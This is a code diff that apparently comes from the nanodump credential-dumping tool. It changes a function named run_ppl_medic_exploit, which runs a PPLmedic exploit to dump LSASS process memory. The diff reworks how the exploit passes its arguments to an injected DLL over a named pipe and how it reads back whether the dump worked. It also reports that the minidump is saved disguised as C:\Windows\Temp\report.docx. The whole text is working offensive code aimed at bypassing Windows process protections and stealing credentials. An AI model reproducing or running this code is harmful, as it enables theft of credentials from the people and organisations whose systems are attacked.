@@ -6,16 +6,13 @@
 BOOL run_ppl_medic_exploit(
     IN unsigned char nanodump_ppl_medic_dll[],
     IN unsigned int nanodump_ppl_medic_dll_len,
-    IN DWORD lsass_pid,
     IN LPSTR dump_path,
     IN BOOL use_valid_sig,
-    IN BOOL duplicate_handle,
-    IN BOOL elevate_handle,
-    IN BOOL duplicate_elevate,
-    IN DWORD spoof_callstack)
+    IN BOOL elevate_handle)
 {
     BOOL       success                      = FALSE;
     BOOL       ret_val                      = FALSE;
+    BOOL       dump_worked                  = FALSE;
     BOOL       StateTypeLibCreated          = FALSE;
 #if PASS_PARAMS_VIA_NAMED_PIPES == 1
     HANDLE     hPipe                        = NULL;
@@ -259,25 +256,35 @@ BOOL run_ppl_medic_exploit(
         PRINT("The exploit was successfull!");
         PRINT("By default, the minidump will have an invalid signature and will be written at the path C:\\Windows\\Temp\\report.docx");
 #else
-        success = send_arguments_from_pipe(
-            &hPipe,
-            lsass_pid,
-            dump_path,
-            use_valid_sig,
-            duplicate_handle,
-            elevate_handle,
-            duplicate_elevate,
-            spoof_callstack);
+        success = client_connect_to_named_pipe(
+            IPC_PIPE_NAME,
+            &hPipe);
         if (!success)
-        {
-            PRINT_ERR("Failed to send the arguments to the remote DLL");
             goto cleanup;
-        }
 
-        print_success(
+        success = client_send_arguments_from_pipe(
+            hPipe,
             dump_path,
             use_valid_sig,
-            TRUE);
+            elevate_handle);
+        if (!success)
+            goto cleanup;
+
+        success = client_recv_success(
+            hPipe,
+            &dump_worked);
+
+        if (success && dump_worked)
+        {
+            print_success(
+                dump_path,
+                use_valid_sig,
+                TRUE);
+        }
+        else
+        {
+            PRINT_ERR("The exploit worked but the DLL could not create the minidump");
+        }
 #endif
     }
 
